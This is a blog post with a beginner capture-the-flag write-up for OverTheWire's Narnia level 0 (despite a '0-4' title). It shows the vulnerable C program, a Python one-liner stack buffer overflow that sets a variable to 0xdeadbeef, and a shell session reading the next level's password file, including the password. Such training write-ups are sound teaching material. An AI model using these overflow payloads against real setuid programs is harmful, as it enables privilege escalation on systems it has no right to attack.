---
layout: post
title:  "Overthewire.org - Narnia 0-4"
date:   2020-04-26 15:07:19
categories: [Binary Exploitation]
comments: true
---

This blogpost contains the solutions for Narnia series of challenges from overthewire, this category of challenges are aimed at beginners to binary exploitation.

First step is ssh into overthewire.org with the provided credentials for narnia challenges.All Narnia binaries and source files are located in /narnia/. 

Let's take a look at the code of this program.The below C code is the source code for the first challenge in the Narnia series of challenges from Overthewire.
```c++

#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
From the code it's clear we need to give val the value of 0xdeadbeef to get a shell as narnia1 user.
By observing the code we can spot the issue from scanf() function. The scanf() is used to get the input for buffer buff. and this function have no bound checkings on input,hence we can overwrite the variable “val” with any value we like.
```

```bash
file narnia0
narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped
```
Our target binary is an ELF 32-bit binary.ELF is Executable Linkable Format which consists of a symbol look-ups and relocatable table, that is, it can be loaded at any memory address by the kernel.

## Exploitation

Let's send some crafted inpu to the program and observe 

```python
narnia0@narnia:/narnia$ python -c 'print 20 * "A" + "CCCC"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAACCCC
val: 0x43434343
WAY OFF!!!!
narnia0@narnia:/narnia$ 
```
Great we have overwritten the val variable with 0x43434343 which is our 4 "C". Now we know we can overite the val variable . We just need to replace "C" with 0xdeadbeef which is the correct value the program accept. Before that we need to convert 0xdeadbeef to little endian format which is "\xef\xbe\xad\xde".

## Grabbing the flag:

```python
narnia0@narnia:/narnia$ (python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
id
uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
## Conclusion 
Running the above command give us a shell as narnia1, now we can cat the flag. This is a very simple buffer overflow example.



